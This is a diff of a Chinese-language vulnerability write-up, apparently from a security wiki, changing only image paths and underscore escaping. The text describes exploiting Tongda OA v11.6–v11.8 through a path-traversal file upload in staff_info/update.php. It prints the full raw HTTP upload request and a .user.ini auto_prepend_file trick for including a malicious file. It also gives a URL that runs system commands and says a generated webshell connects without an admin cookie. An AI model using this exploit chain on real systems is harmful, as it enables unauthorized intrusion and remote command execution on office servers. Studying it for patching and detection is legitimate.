@@ -20,7 +20,7 @@
 
 这里使用的环境为通达 v11.6版本
 
-出现漏洞的文件为 **webroot/general/hr/manage/staff_info/update.php**
+出现漏洞的文件为 **webroot/general/hr/manage/staff\_info/update.php**
 
 ```php
 <?php
@@ -65,19 +65,19 @@ if ($PHOTO_NAME0 != "") {
 }
 ```
 
-![image-20220209111844985](images/202202091118195.png)
+![image-20220209111844985](../.gitbook/assets/202202091118195.png)
 
-在这里参数 **$USER_ID** 是可控的，并且无过滤危险符号就拼接进去了，那我们传入 **../../../** 我们就可以任意文件上传了
+在这里参数 **$USER\_ID** 是可控的，并且无过滤危险符号就拼接进去了，那我们传入 **../../../** 我们就可以任意文件上传了
 
 由于通达OA 的文件上传限制的死死的，所以我们可以通过利用 PHP的 **.user.ini** 文件来包含其他文件，这里是可以用于包含PHP语句的文件的，所以我们上传文件内容为
 
-```plain
+```
 auto_prepend_file=peiqi.log
 ```
 
 请求包为
 
-```plain
+```
 POST /general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/.user HTTP/1.1
 Host: 192.168.1.105
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0
@@ -102,27 +102,27 @@ Content-Disposition: form-data; name="submit"
 -----------------------------17518323986548992951984057104--
 ```
 
-其中 **USER_ID=../../general/reportshop/workshop/report/attachment-remark/.user** 为上传路径
+其中 **USER\_ID=../../general/reportshop/workshop/report/attachment-remark/.user** 为上传路径
 
 关于更多原理参考 http://wiki.peiqi.tech 中的另一篇 通达OA v11.8 后台文件包含存储型XSS漏洞
 
 这里我们简单知道了上传方式，那我们就通过 **.user.ini文件** 包含恶意文件
 
-![image-20220209111908637](images/202202091119726.png)
+![image-20220209111908637](../.gitbook/assets/202202091119726.png)
 
 现在已经成功上传了恶意文件
 
 访问 http://xxx.xxx.xxx.xxx/general/reportshop/workshop/report/attachment-remark/form.inc.php?peiqi=ipconfig 文件包含命令执行
 
-![image-20220209111927060](images/202202091119206.png)
+![image-20220209111927060](../.gitbook/assets/202202091119206.png)
 
 在 v11.6中 上传的位置并没有限定所以可以上传在方便访问的目录(不需要登录)
 
 而 v11.8中则有目录名的限制需要目录带有 webroot 和 attachment
 
-![image-20220209112005410](images/202202091120519.png)
+![image-20220209112005410](../.gitbook/assets/202202091120519.png)
 
-![image-20220209112022434](images/202202091120543.png)
+![image-20220209112022434](../.gitbook/assets/202202091120543.png)
 
 ## 漏洞POC
 
@@ -230,7 +230,7 @@ if __name__ == '__main__':
     POC_1(target_url, Cookie)
 ```
 
-![image-20220209112046258](images/202202091120453.png)
+![image-20220209112046258](../.gitbook/assets/202202091120453.png)
 
 v11.8及以下可连接蚁剑生成的webshell控制,且生成后不需要管理员Cookie即可连接
 
@@ -336,5 +336,4 @@ if __name__ == '__main__':
     POC_1(target_url, Cookie)
 ```
 
-![image-20220209112120203](images/202202091121379.png)
-
+![image-20220209112120203](../.gitbook/assets/202202091121379.png)
